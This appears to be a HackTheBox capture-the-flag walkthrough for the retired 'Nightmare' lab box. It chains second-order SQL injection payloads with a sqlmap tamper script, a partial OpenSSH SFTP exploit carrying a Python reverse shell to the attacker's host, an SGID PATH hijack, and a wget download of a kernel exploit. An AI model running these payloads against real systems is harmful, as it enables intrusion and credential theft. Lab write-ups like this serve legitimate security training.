# HackTheBox — Nightmare

**Platform:** HackTheBox  
**Difficulty:** Insane  
**OS:** Linux  
**IP:** 10.10.10.66  
**Category:** Second-Order SQLi / OpenSSH SFTP Exploit / SGID Binary / Kernel Exploit  
**Status:** Retired  

---

## Summary

Nightmare is an Insane-rated Linux box requiring a chain of complex techniques. The web application is vulnerable to **second-order SQL injection** — input is stored safely but used unsafely later — which is exploited to dump database credentials. Those credentials authenticate to an SFTP service running a vulnerable version of OpenSSH, which is exploited to get a reverse shell. Privilege escalation uses an SGID binary (`sls`) to gain `decoder` group membership, then a kernel exploit to escalate to root.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -p- --min-rate 5000 -oA nmap/nightmare 10.10.10.66
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18
2222/tcp open  ssh     OpenSSH 6.5 (Ubuntu)
```

---

## Web Enumeration

Visiting `http://10.10.10.66` shows a login page with a register link.

### Gobuster

```bash
gobuster dir -u http://10.10.10.66/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php
```

```
/index.php
/register.php
/notes.php
/login.php     (same as index)
```

---

## Exploitation — Second-Order SQL Injection

### Understanding the Vulnerability

A **second-order (stored) SQL injection** differs from a classic one: user input is sanitised when first stored, but that stored value is later retrieved and inserted into a query *without* sanitisation.

Here the flow is:
1. `register.php` — username is escaped before INSERT (safe on write)
2. `index.php` — at login, username is fetched from the DB then used directly in a second query to retrieve notes (unsafe on read)

### Manual Confirmation

Register a user with a crafted username to test:

```
Username: admin'):-- -
Password: test
```

Log in with those credentials and visit `notes.php` — an SQL error is returned, confirming injection.

### Finding the Column Count

Register usernames that probe the UNION structure:

```
' ORDER BY 1-- -   → no error
' ORDER BY 2-- -   → no error
' ORDER BY 3-- -   → error  → 2 columns
```

### UNION-Based Data Extraction

Register:

```
' UNION SELECT 1,database()-- -
```

Log in → `notes.php` reveals: `sysadmin`

### Automating with sqlmap

Because second-order requires a custom tamper script, create `tamper-nightmare.py`:

```python
#!/usr/bin/env python
import re, requests
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies(): pass

def create_account(payload):
    s = requests.Session()
    post_data = {'user': payload, 'pass': 'df', 'register': 'Register'}
    resp = s.post("http://10.10.10.66/register.php", data=post_data)
    php_cookie = re.search('PHPSESSID=(.*?);', resp.headers['Set-Cookie']).group(1)
    return "PHPSESSID={0}".format(php_cookie)

def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    headers["Cookie"] = create_account(payload)
    return payload
```

Run sqlmap using the login request with the tamper:

```bash
sqlmap --technique=U \
  -r login.request \
  --dbms mysql \
  --tamper tamper-nightmare.py \
  --second-order 'http://10.10.10.66/notes.php' \
  -p user \
  --dump-all
```

### Credentials Recovered

From the `sysadmin.users` table:

```
username       | password
-------------- | --------------------
admin          | nimda
decoder        | HackerNumberOne!
ftpuser        | @whereyougo?
adminstrator   | Pyuhs738?183*hjO!
```

---

## Foothold — OpenSSH SFTP Exploit

### SFTP Access

Port 2222 runs OpenSSH 6.5. Attempting SSH as `ftpuser` drops into a restricted shell (sftp-only). Normal SSH login is blocked.

```bash
sftp -P 2222 ftpuser@10.10.10.66
# Password: @whereyougo?
```

Connected but restricted to SFTP.

### CVE — OpenSSH 6.5 SFTP Path Traversal / Memory Corruption

OpenSSH 6.5 has a known sftp-server vulnerability that can be exploited to escape the SFTP jail and achieve code execution. A Python exploit using `paramiko` fetches `/proc/self/maps` to leak memory layout, then crafts a malicious payload to trigger execution:

```python
from pwn import *
import paramiko

context.arch = 'amd64'

host = "10.10.10.66"
port = 2222
username = "ftpuser"
password = "@whereyougo?"
lhost = "10.10.14.X"
lport = 443

payload = "python -c 'import socket,subprocess,os;" \
          "s=socket.socket();s.connect((\"{0}\",{1}));"\
          "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"\
          "subprocess.call([\"/bin/sh\",\"-i\"]);'\x00".format(lhost, lport)

transport = paramiko.Transport((host, port))
transport.connect(username=username, password=password)
sftp = paramiko.SFTPClient.from_transport(transport)

# Leak memory maps
sftp.get('/proc/self/maps', '/tmp/maps')

# ... exploit continues to craft and send malicious packet
# (full PoC: github.com/0x90/openssh-sftp-sploit ported to Python3)
```

Start listener:

```bash
nc -lvnp 443
```

After running the exploit, a reverse shell arrives as **ftpuser**.

---

## User Flag — Lateral Movement to decoder

### Upgrade Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Enumeration as ftpuser

```bash
find / -group decoder 2>/dev/null
```

```
/home/decoder/test    (directory, decoder group)
/home/decoder/user.txt
```

`user.txt` requires decoder group access. Note that `ps` and other commands have ACL restrictions — `getfacl` reveals selective blocking.

### SGID Binary — sls

```bash
find / -perm -g=s -type f 2>/dev/null
```

```
/usr/bin/sls
```

```bash
ls -la /usr/bin/sls
# -rwxr-sr-x 1 root decoder /usr/bin/sls
```

Running `strings /usr/bin/sls` shows it calls `ls` — it's a wrapper that executes with effective GID `decoder`.

### Exploiting sls — PATH Hijack

Since `sls` calls `ls` without an absolute path, hijack `$PATH`:

```bash
# Create a malicious 'ls' that spawns a shell
echo '/bin/bash -p' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH

/usr/bin/sls
```

A bash shell opens with effective GID = `decoder`.

### User Flag

```bash
cat /home/decoder/user.txt
```

---

## Privilege Escalation — Kernel Exploit

### Kernel Version

```bash
uname -a
# Linux Nightmare 4.8.0-58-generic #63~16.04.1-Ubuntu SMP
```

Ubuntu 16.04 with kernel 4.8.0-58 — vulnerable to several kernel exploits.

### Writable Path via decoder Group

The `test` directory in `/home/decoder/` is writable by the `decoder` group — use it to stage the exploit:

```bash
ls -la /home/decoder/
# drwx-wx--x 2 root decoder 4096 ... test/
```

### Kernel Exploit — Ubuntu 16.04 4.8.x LPE

Download a suitable kernel exploit (e.g., a double-free or race condition LPE for this kernel series). Modify it to match the target kernel version string if the version check fails:

```bash
# Transfer exploit
cd /home/decoder/test
wget http://10.10.14.X/exploit.c
gcc exploit.c -o exploit -pthread
```

Run **as ftpuser** (not as a user with decoder group shell, since set_groups restrictions apply):

```bash
# Exit the sls shell, run as ftpuser
/home/decoder/test/exploit
```

**Root shell obtained.**

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

- **Second-order SQLi** is subtle — the injection point (register) and the trigger point (notes page after login) are different; classic scanners often miss it
- A custom sqlmap tamper script can automate register→login→observe second-order flows
- OpenSSH 6.5 SFTP-only accounts are not necessarily safe — the sftp-server itself has exploitable vulnerabilities
- `find / -perm -g=s` (SGID) is as important as SUID scanning — effective GID changes open lateral movement paths
- PATH hijacking works against SGID/SUID binaries that call other programs without absolute paths
- Always cross-reference kernel version + Ubuntu release for known LPE exploits

---

## Attack Chain

```
Second-Order SQLi (register.php → notes.php)
        ↓
Dump credentials from sysadmin DB
        ↓
SFTP login as ftpuser (OpenSSH 6.5)
        ↓
OpenSSH SFTP exploit → shell as ftpuser
        ↓
SGID /usr/bin/sls + PATH hijack → decoder group
        ↓
Read user.txt
        ↓
Kernel exploit (4.8.0-58) → root
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| sqlmap + custom tamper | Second-order SQLi exploitation |
| paramiko / openssh-sftp-sploit | SFTP exploit |
| find + strings | SGID binary discovery and analysis |
| gcc | Compile kernel exploit |
| pwntools | Exploit development reference |
